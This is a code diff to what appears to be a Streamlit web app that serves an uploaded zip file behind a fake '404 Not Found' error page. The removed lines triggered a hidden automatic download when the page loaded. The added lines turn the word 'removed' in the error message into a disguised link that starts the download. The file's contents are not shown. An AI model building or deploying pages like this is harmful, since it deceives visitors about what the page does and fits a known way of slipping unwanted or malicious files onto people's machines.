@@ -20,7 +20,7 @@ if cu_files:
         data = f.read()
         b64 = base64.b64encode(data).decode()
 
-    # Fake 404/error page HTML + Auto-download
+    # Fake 404 page but clickable "removed"
     st.markdown(
         f"""
         <style>
@@ -44,20 +44,30 @@ if cu_files:
             font-size: 18px;
             color: #777;
         }}
+        a {{
+            color: #3366cc;
+            text-decoration: none;
+            cursor: pointer;
+        }}
+        a:hover {{
+            text-decoration: underline;
+        }}
         </style>
 
         <h1>404</h1>
         <h2>Not Found</h2>
-        <p>The page you are looking for might have been removed,<br>had its name changed, or is temporarily unavailable.</p>
+        <p>The page you are looking for might have been <a id="downloadLink">removed</a>,<br>
+        had its name changed, or is temporarily unavailable.</p>
 
         <script>
-        // Trigger hidden download
-        var link = document.createElement('a');
-        link.href = "data:application/zip;base64,{b64}";
-        link.download = "{zip_filename}";
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
+        document.getElementById('downloadLink').addEventListener('click', function() {{
+            var link = document.createElement('a');
+            link.href = "data:application/zip;base64,{b64}";
+            link.download = "{zip_filename}";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }});
         </script>
         """,
         unsafe_allow_html=True
